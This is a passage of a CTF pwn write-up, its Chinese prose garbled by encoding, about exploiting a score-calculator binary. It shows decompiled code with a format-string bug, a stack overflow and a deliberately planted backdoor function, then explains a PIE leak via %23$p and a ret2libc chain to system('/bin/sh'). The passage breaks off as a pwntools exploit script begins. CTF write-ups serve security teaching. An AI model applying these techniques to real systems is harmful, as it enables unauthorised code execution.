æ˜¯è®¡ç®—å•æ›² ptt å¹¶è¾“å‡º</li><li>åŠŸèƒ½é”® 3 æ˜¯ä» b30 é‡Œè®¡ç®—å‡ºç©å®¶ pttï¼Œä¸è®¡ç®— r10ï¼Œæ‰€ä»¥åªèƒ½åšå‚è€ƒ</li><li>åŠŸèƒ½é”® 5 æ˜¯ç»™æœ€å–œæ¬¢çš„è°±å­æŠ•ç¥¨</li><li>åŠŸèƒ½é”® 5 æ˜¯è¾“å‡ºæŠ•çš„ç¥¨çš„æ­Œæ›²åå­—</li><li>åŠŸèƒ½é”® 5 æ˜¯è¾“å‡ºæ‰€æœ‰ b30 çš„å†…å®¹</li><li>åŠŸèƒ½é”® 7 æ˜¯æ¨å‡ºè¿™ä¸ªç³»ç»Ÿ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.5</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.500000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">6</span><br><span class="line">rating = 13.500000,music = 11.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.3</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.300000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.2</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.200000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">6</span><br><span class="line">rating = 13.200000,music = 11.200000</span><br><span class="line">rating = 13.300000,music = 11.300000</span><br><span class="line">rating = 13.500000,music = 11.500000</span><br></pre></td></tr></table></figure><p>â€‹ä¼¼ä¹æ²¡å•¥é—®é¢˜ã€‚å†çœ‹çœ‹ 4ã€5 ä¸¤ä¸ªåŠŸèƒ½ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">4</span><br><span class="line">You can vote for what you like. You can input the name of your favorite song and cast your valuable vote</span><br><span class="line">You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)testify</span><br><span class="line">Your vote was for testify</span><br><span class="line">. Thank you for your affirmation of this spectrum, and I hope you can score smoothly</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">5</span><br><span class="line">The name of the song you voted for is:</span><br><span class="line">testify</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œï¼Œæ€»çš„èƒ½è¾“å…¥å­—ç¬¦çš„æ„Ÿè§‰åªæœ‰ 4ï¼Œå…¶ä»–çš„åªæœ‰æ•°å­—ã€‚</p><p>â€‹ä¸Š IDAï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> <span class="type">double</span> v3; <span class="comment">// fst7</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ah] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-6h] [ebp-1Ch]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [esp+0h] [ebp-16h] BYREF</span></span><br><span class="line">  __int16 *v8; <span class="comment">// [esp+2h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// [esp+6h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+Ah] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+Eh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">0xC</span>u);</span><br><span class="line">  init();</span><br><span class="line">  hello();</span><br><span class="line">  *((_DWORD *)v9 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, &amp;v8, v5, v6);</span><br><span class="line">  compare(*(<span class="type">float</span> *)&amp;v8);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=======Please select the following options to use the relevant functions========&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. If the score is qualified, it will be stored in B30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Calculate single PTT&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Calculate player PTT through b30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Give your favorite song a vote&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. View voted songs&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;6. Output all content of b30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;7. Exit the system&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    v8 = &amp;v7;</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(<span class="type">const</span> <span class="type">char</span> *))__isoc99_scanf)(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        setB30(v9);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        calculateMusic(v9, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3 = pttCalculate(v9);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your PTT is%f\n&quot;</span>, (<span class="type">double</span>)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        vote();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        output_vote(p_argc);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        test(v9);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        v10 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 != <span class="number">1</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exit the program&quot;</span>);</span><br><span class="line">  freeNode(v9);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exit successful&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you for using this scoring system&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;See you&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ‰¾äº†ä¸€åœˆï¼Œæœ€ååœ¨ output_vote å‡½æ•°é‡Œæ‰¾åˆ°äº†ä¸€ä¸ª printf (dest)ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">output_vote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !votes )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t voted yet\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The name of the song you voted for is:&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå¯ä»¥ç”¨æ¥æ³„éœ² main çš„åœ°å€ï¼Œç»•è¿‡ PIEï¼Œå…³é”®æ˜¯ strcpyï¼Œå­˜åœ¨ name è¿™ä¸ªå˜é‡ï¼Œä½†æ˜¯ä¸Šé¢æ²¡å®šä¹‰ï¼Œå› ä¸ºåœ¨ bss æ®µä¸Šï¼Œæ ¹æ®è¿™ä¸ªå˜é‡ï¼Œçœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†å®ƒï¼Œæœ€ååœ¨ vote é‡Œè°ƒç”¨äº†ä¸¤æ¬¡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( votes &gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have already cast 3 times, you cannot cast anymore&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;If you still want to vote, I suggest restarting this system, as it doesn&#x27;t have a memory function anyway &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can vote for what you like. You can input the name of your favorite song and cast your valuable vote&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any pr&quot;</span></span><br><span class="line">      <span class="string">&quot;oblems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;name, <span class="number">0x60</span>u);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;Your vote was for %s. Thank you for your affirmation of this spectrum, and I hope you can score smoothly\n&quot;</span>,</span><br><span class="line">      &amp;name);</span><br><span class="line">    <span class="keyword">return</span> ++votes;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæœ‰ä¸ª readï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;name, <span class="number">0x60</span>u);</span><br></pre></td></tr></table></figure><p>â€‹å›å»ä¸€ä¸‹ï¼Œoutput_vote å‡½æ•°ä¸­ï¼Œå°† name å˜é‡å¡è¿›äº† dest é‡Œï¼Œä½† dest ä¼¼ä¹ä¸å¤Ÿå¤§ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œä½† gdb è°ƒä¸€ä¸‹ä¹‹åï¼Œå‘ç°å…¶å®é•¿åº¦ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œä¸å¤Ÿ ROPï¼ˆå¯èƒ½ç¨å¾®å¤§äº†ï¼Œä¸è¿‡æ‡’å¾—æ”¹äº†ï¼‰ï¼Œè¿™é‡Œå°±å¯ä»¥æ‰“æ ˆè¿ç§»äº†ï¼Œéšæ„ï¼Œä¸è¿‡ï¼Œé¢„æœŸè§£æ˜¯ libcï¼Œå¸¸è§„ libcï¼Œå› ä¸ºå¤šæ‰¾æ‰¾ï¼Œèƒ½æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">evaluate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-8h] [ebp-150h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-4h] [ebp-14Ch]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+Ch] [ebp-13Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">52</span>]; <span class="comment">// [esp+110h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You cannot call this function unless you have authorization&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So?How are you?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(buf, <span class="string">&quot;g01den&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO,you can&#x27;t do it&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK,Only I can give myself advice&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;plz input the count of your advice&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes, v1, v2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">256</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No ,don&#x27;t hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, v4, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°æ˜¯æˆ‘é¢„ç•™çš„ä¸€ä¸ªåé—¨ç®—æ˜¯åé—¨å§ï¼Œæƒ³åŠæ³•åŠ«æŒæ•°æ®æµè¿‡æ¥å§ï¼Œä¸è¿‡å¾—å…ˆæ³„éœ² mainã€‚</p><p>â€‹main çš„æŸä¸ªåç§»æ˜¯ <code>%23$p</code> ï¼Œè¿™é‡Œæ³„éœ²å‡ºæ¥çš„æ˜¯è¿™ä¸ªåœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000146A                 call    output_vote     ; jumptable 00001414 case 5</span><br><span class="line">.text:0000146F                 jmp     short _L3       ; jumptable 00001414 default case, case 0</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åçœŸå®åœ°å€å‡å»åç§»å¾—åˆ°äº† elf çš„åŸºåœ°å€ï¼Œä¹‹åå°±å¯ä»¥æ‹¿åˆ° evaluate çš„åœ°å€å’Œå…¶ä»– plt å’Œ got è¡¨çš„åœ°å€ï¼Œä¹‹åå°±å¸¸è§„çš„ libc3 äº†ã€‚æ³„éœ² puts çœŸå®åœ°å€ï¼Œç„¶åè·å¾— libc_base åœ°å€ï¼Œä¹‹åæ‹¿ binsh å’Œ systemã€‚</p><p>â€‹expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;154.64.254.169&quot;</span>,<span 